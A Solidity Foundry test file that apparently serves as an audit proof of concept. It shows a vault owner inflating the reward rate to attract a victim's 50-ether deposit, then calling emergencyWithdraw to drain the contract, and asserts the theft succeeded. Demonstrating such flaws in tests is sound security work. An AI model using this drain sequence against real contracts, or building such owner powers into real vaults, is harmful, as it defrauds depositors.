// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VulnerableVault.sol";

contract ExploitTest is Test {
    VulnerableVault target;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    
    function setUp() public {
        // Deploy contracts
        vm.prank(owner);
        target = new VulnerableVault();
        
        // Fund accounts using vm.deal()
        vm.deal(owner, 10 ether);
        vm.deal(attacker, 10 ether);
        vm.deal(victim, 100 ether);
        vm.deal(address(target), 100 ether);
    }
    
    function test_OwnerManipulationOfRewardRate() public {
        // Record initial state
        uint256 initialContractBalance = address(target).balance;
        uint256 initialVictimBalance = victim.balance;
        
        // Step 1: Owner sets an extremely high reward rate
        vm.startPrank(owner);
        target.setRewardRate(100); // 100% reward rate
        vm.stopPrank();

        // Step 2: Victim deposits funds expecting high returns
        vm.startPrank(victim);
        target.deposit{value: 50 ether}();
        vm.stopPrank();

        // Step 3: Owner withdraws funds before users can claim rewards
        vm.startPrank(owner);
        target.emergencyWithdraw(owner);
        vm.stopPrank();
        
        // Assert exploit success
        assertEq(address(target).balance, 0, "Contract should be drained");
        assertGt(owner.balance, 10 ether, "Owner should have stolen funds");
        assertEq(victim.balance, initialVictimBalance - 50 ether, "Victim should have lost deposit");
    }
}
